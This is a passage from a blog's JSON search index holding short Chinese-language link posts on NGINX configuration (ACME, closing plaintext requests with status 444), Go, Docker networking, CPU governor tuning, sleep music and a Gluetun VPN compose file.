{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003edefault_server\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e_\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# ACME 模块会自动处理 /.well-known/acme-challenge/ 的请求，此 location 用于处理所有其他请求\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e301\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttps://\u003c/span\u003e$host$request_uri;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","NGINX","ACME","module"],"title":"NGINX 原生 ACME 支持：从根本上重塑 TLS 自动化部署"},{"categories":["URL","NGINX"],"contents":" 降低家用 Web 服务被通报的概率\n通过明文协议尝试请求 HTTPS 服务在 Nginx 中有分配特殊的 497 状态码。如果发生该报错，我们希望 Nginx 直接关闭连接，不返回任何响应。这需要用到另外一个非标状态码 444，综合两种状态码，我们需要在 server 中增加如下配置：\nerror_page 497 @close; location @close { return 444; } 使用 error_page 指令为 497 状态码设置虚拟路径@close，Nginx 在处理的@close 时发现是返回 444 状态码，于是直接关闭连接。\n这个时候你再用 curl 访问对应的端口就会收到如下报错：\ncurl http://example.zz.ac:5678 curl: (52) Empty reply from server\nserver { listen 5678 ssl; listen [::]:5678 ssl; server_name example.zz.ac; ssl_certificate ...; ssl_certificate_key ..; error_page 497 @close; location @close { return 444; } ... } server { listen 5678 ssl default_server;; listen [::]:5678 ssl default_server;; server_name _; ssl_certificate ...; ssl_certificate_key ..; return 444; } ","date":"October 2, 2025","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20251002-hide-web/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://tao.zz.ac/homelab/hide-web.html\" target=\"_blank\" rel=\"noopener\"\u003e降低家用 Web 服务被通报的概率\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过明文协议尝试请求 HTTPS 服务在 Nginx 中有分配特殊的 497 状态码。如果发生该报错，我们希望 Nginx 直接关闭连接，不返回任何响应。这需要用到另外一个非标状态码 444，综合两种状态码，我们需要在 server 中增加如下配置：\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eerror_page\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e497\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e@close\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e@close\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e444\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e使用 error_page 指令为 497 状态码设置虚拟路径@close，Nginx 在处理的@close 时发现是返回 444 状态码，于是直接关闭连接。\u003c/p\u003e\n\u003cp\u003e这个时候你再用 curl 访问对应的端口就会收到如下报错：\u003c/p\u003e\n\u003cp\u003ecurl \u003ca href=\"http://example.zz.ac:5678\" target=\"_blank\" rel=\"noopener\"\u003ehttp://example.zz.ac:5678\u003c/a\u003e\ncurl: (52) Empty reply from server\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e5678\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e[::]:5678\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eexample.zz.ac\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003essl_certificate\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e...\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003essl_certificate_key\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e..\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eerror_page\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e497\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e@close\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e@close\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e444\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e...\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e5678\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003edefault_server\u003c/span\u003e;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e[::]:5678\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003edefault_server\u003c/span\u003e;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e_\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003essl_certificate\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e...\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003essl_certificate_key\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e..\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e444\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","NGINX"],"title":"降低家用 Web 服务被通报的概率"},{"categories":["URL","EFF","Browser","Extension"],"contents":" Privacy Badger：EFF 推出的免費瀏覽器擴充套件，用來阻止網路監控追蹤 ","date":"September 29, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250929-eff-browser-extension/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://privacybadger.org/\" target=\"_blank\" rel=\"noopener\"\u003ePrivacy Badger：EFF 推出的免費瀏覽器擴充套件，用來阻止網路監控追蹤\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","EFF","Browser","Extension"],"title":"Privacy Badger：EFF 推出的免費瀏覽器擴充套件，用來阻止網路監控追蹤"},{"categories":["URL","Golang","Container"],"contents":" Containers From Scratch by Golang (feat. Liz Rice) container-from-scratch-golang As we enhance the functionality of our small program, we will explore the following topics, allowing us to create a basic simulation of a non-production container environment.\nUTS Namespace Chroot PID Namespace Mount Namespace Control Group Rootless Container ","date":"September 10, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250910-containers-from-scratch-by-golang-feat-liz-rice/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://baconyao.notion.site/Containers-From-Scratch-by-Golang-feat-Liz-Rice-2638a3a7d9d48053ae1dce0763fb52e8\" target=\"_blank\" rel=\"noopener\"\u003eContainers From Scratch by Golang (feat. Liz Rice)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/baconYao/container-from-scratch-golang\" target=\"_blank\" rel=\"noopener\"\u003econtainer-from-scratch-golang\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eAs we enhance the functionality of our small program, we will explore the following topics, allowing us to create a basic simulation of a non-production container environment.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eUTS Namespace\u003c/li\u003e\n\u003cli\u003eChroot\u003c/li\u003e\n\u003cli\u003ePID Namespace\u003c/li\u003e\n\u003cli\u003eMount Namespace\u003c/li\u003e\n\u003cli\u003eControl Group\u003c/li\u003e\n\u003cli\u003eRootless Container\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Golang","Container"],"title":"Containers From Scratch by Golang (feat. Liz Rice)"},{"categories":["URL","Golang"],"contents":" 淺談 Go Iterator type Seq[V any] func(yield func(V) bool) type Seq2[K, V any] func(yield func(K, V) bool) ","date":"September 6, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250906-golang-iterator/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ganhua.wang/go-iterator\" target=\"_blank\" rel=\"noopener\"\u003e淺談 Go Iterator\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eSeq\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003eV\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eany\u003c/span\u003e] \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eyield\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eV\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003ebool\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eSeq2\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003eK\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eV\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eany\u003c/span\u003e] \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eyield\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eK\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eV\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003ebool\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Golang"],"title":"淺談 Go Iterator"},{"categories":["URL","Linux","Docker","nftables"],"contents":" Docker 容器无法访问外网？nftables 下的 NAT 配置指南 ","date":"September 3, 2025","hero":"/images/hero/docker.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250903-linux-docker-nftables/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.ibytebox.com/archives/docker-rong-qi-wu-fa-fang-wen-wai-wang-nftables-xia-de-nat-pei-zhi-zhi-nan\" target=\"_blank\" rel=\"noopener\"\u003eDocker 容器无法访问外网？nftables 下的 NAT 配置指南\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Linux","Docker","nftables"],"title":"Docker 容器无法访问外网？nftables 下的 NAT 配置指南"},{"categories":["URL","Linux","CPU"],"contents":" 独立服务器 CPU 频率最大化配置指南 看看 CPU 现在混哪种模式 前提条件 系统：Linux（Debian、Ubuntu、Proxmox 等都行）\n权限：root\nCPU：支持动态调频（Intel Xeon、AMD EPYC / Ryzen 等）\ngovernor cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor\npowersave：节能小绵羊（频率锁低，省电但废武功） ondemand：按需加速（要用时才升频，可能反应慢半拍） performance：全程高能（我们要的就是它！💪） 确认内核到底用的哪种驱动（Intel / AMD） cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_driver\n临时拉满性能 for cpu in /sys/devices/system/cpu/cpu[0-9]*; do echo performance \u0026gt; $cpu/cpufreq/scaling_governor done 重启后也保持高能 方案 A：最稳妥推荐 apt install cpufrequtils -y echo \u0026#39;GOVERNOR=\u0026#34;performance\u0026#34;\u0026#39; \u0026gt;/etc/default/cpufrequtils systemctl enable cpufrequtils systemctl start cpufrequtils 方案 B：systemd 自定义服务 # /etc/systemd/system/cpu-performance.service [Unit] Description=Set CPU governor to performance After=multi-user.target [Service] Type=oneshot ExecStart=/bin/bash -c \u0026#39;for cpu in /sys/devices/system/cpu/cpu[0-9]*; do echo performance \u0026gt; $cpu/cpufreq/scaling_governor; done\u0026#39; [Install] WantedBy=multi-user.target systemctl daemon-reexec systemctl daemon-reload systemctl enable --now cpu-performance.service ","date":"September 2, 2025","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250902-linux-cpu-performance/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.ibytebox.com/archives/02cf4c4a-0af7-43f1-bb65-ccdb54a52306\" target=\"_blank\" rel=\"noopener\"\u003e独立服务器 CPU 频率最大化配置指南\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"看看-cpu-现在混哪种模式\"\u003e看看 CPU 现在混哪种模式\u003c/h2\u003e\n\u003cp\u003e前提条件\n系统：Linux（Debian、Ubuntu、Proxmox 等都行）\u003c/p\u003e\n\u003cp\u003e权限：root\u003c/p\u003e\n\u003cp\u003eCPU：支持动态调频（Intel Xeon、AMD EPYC / Ryzen 等）\u003c/p\u003e\n\u003ch3 id=\"governor\"\u003egovernor\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003ecat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003epowersave：节能小绵羊（频率锁低，省电但废武功）\u003c/li\u003e\n\u003cli\u003eondemand：按需加速（要用时才升频，可能反应慢半拍）\u003c/li\u003e\n\u003cli\u003eperformance：全程高能（我们要的就是它！💪）\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"确认内核到底用的哪种驱动intel--amd\"\u003e确认内核到底用的哪种驱动（Intel / AMD）\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003ecat /sys/devices/system/cpu/cpu0/cpufreq/scaling_driver\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"临时拉满性能\"\u003e临时拉满性能\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e cpu in /sys/devices/system/cpu/cpu\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e0-9\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e*; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  echo performance \u0026gt; $cpu/cpufreq/scaling_governor\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"重启后也保持高能\"\u003e重启后也保持高能\u003c/h2\u003e\n\u003ch3 id=\"方案-a最稳妥推荐\"\u003e方案 A：最稳妥推荐\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapt install cpufrequtils -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;GOVERNOR=\u0026#34;performance\u0026#34;\u0026#39;\u003c/span\u003e \u0026gt;/etc/default/cpufrequtils\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl enable cpufrequtils\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl start cpufrequtils\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"方案-bsystemd-自定义服务\"\u003e方案 B：systemd 自定义服务\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# /etc/systemd/system/cpu-performance.service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eUnit\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDescription\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eSet CPU governor to performance\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAfter\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eService\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eType\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eoneshot\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStart\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/bin/bash -c \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;for cpu in /sys/devices/system/cpu/cpu[0-9]*; do echo performance \u0026gt; $cpu/cpufreq/scaling_governor; done\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eInstall\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWantedBy\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl daemon-reexec\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl daemon-reload\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl enable --now cpu-performance.service\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Linux","CPU"],"title":"独立服务器 CPU 频率最大化配置指南"},{"categories":["URL","Music","lullaby"],"contents":" 6 首國際最強公認催眠曲 Marconi Union - Weightless 432Hz (深度治癒身心靈 連接宇宙能量) Clair de Lune Deep sleep delta waves - Binaural beats sleep (30 分鐘版本) Erik SATIE - Gymnopédie No. 1 (鋼琴慢速版) Himalayan Healing - Tibetan Singing Bowls Meditation (15 分鐘版本) ","date":"August 29, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250829-music/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.instagram.com/p/DNakVD4P_t9\" target=\"_blank\" rel=\"noopener\"\u003e6 首國際最強公認催眠曲\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003eMarconi Union - Weightless\u003c/li\u003e\n\u003cli\u003e432Hz (深度治癒身心靈 連接宇宙能量)\u003c/li\u003e\n\u003cli\u003eClair de Lune\u003c/li\u003e\n\u003cli\u003eDeep sleep delta waves - Binaural beats sleep (30 分鐘版本)\u003c/li\u003e\n\u003cli\u003eErik SATIE - Gymnopédie No. 1 (鋼琴慢速版)\u003c/li\u003e\n\u003cli\u003eHimalayan Healing - Tibetan Singing Bowls Meditation (15 分鐘版本)\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Music","lullaby"],"title":"6首國際最強公認催眠曲"},{"categories":["URL","Docker","Linux"],"contents":" 透過 LinuxServer.io 打包的 Docker 映像檔，將桌面程式轉成網頁版，透過瀏覽器即可使用 LinuxServer.io 官網 ","date":"August 1, 2025","hero":"/images/hero/docker.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250801-linuxserver.io/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ivonblog.com/posts/linuxserver-io-docker-applications/\" target=\"_blank\" rel=\"noopener\"\u003e透過 LinuxServer.io 打包的 Docker 映像檔，將桌面程式轉成網頁版，透過瀏覽器即可使用\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.linuxserver.io/our-images\" target=\"_blank\" rel=\"noopener\"\u003eLinuxServer.io 官網\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Docker","Linux"],"title":"透過LinuxServer.io打包的Docker映像檔，將桌面程式轉成網頁版，透過瀏覽器即可使用"},{"categories":["URL","Docker","Gluetun","VPN"],"contents":" Gluetun：讓 Docker 容器走 VPN 連線，沒網路就斷線，使用教學 Gluetun OpenVPN services: gluetun: image: qmcgaw/gluetun container_name: gluetun restart: unless-stopped cap_add: - NET_ADMIN devices: - /dev/net/tun:/dev/net/tun ports: - 8888:8888/tcp # HTTP proxy - 8388:8388/tcp # Shadowsocks - 8388:8388/udp # Shadowsocks volumes: - /home/user/gluetun:/gluetun environment: # 按照VPN供應商的OpenVPN設定檔填寫 - VPN_SERVICE_PROVIDER=protonvpn - VPN_TYPE=openvpn - OPENVPN_USER= # OpenVPN帳號 - OPENVPN_PASSWORD= # OpenVPN密碼 - SERVER_COUNTRIES=United Kingdom # 指定伺服器所在國家，以逗號分隔 networks: # (選擇性) 固定Gluetun容器的IP network: ipv4_address: 172.27.0.5 networks: # (選擇性) 固定Gluetun容器的IP network: driver: bridge ipam: config: - subnet: 172.27.0.0/16 gateway: 172.27.0.5 WireGuard services: gluetun: image: qmcgaw/gluetun container_name: gluetun restart: unless-stopped cap_add: - NET_ADMIN devices: - /dev/net/tun:/dev/net/tun ports: - 8888:8888/tcp # HTTP proxy - 8388:8388/tcp # Shadowsocks - 8388:8388/udp # 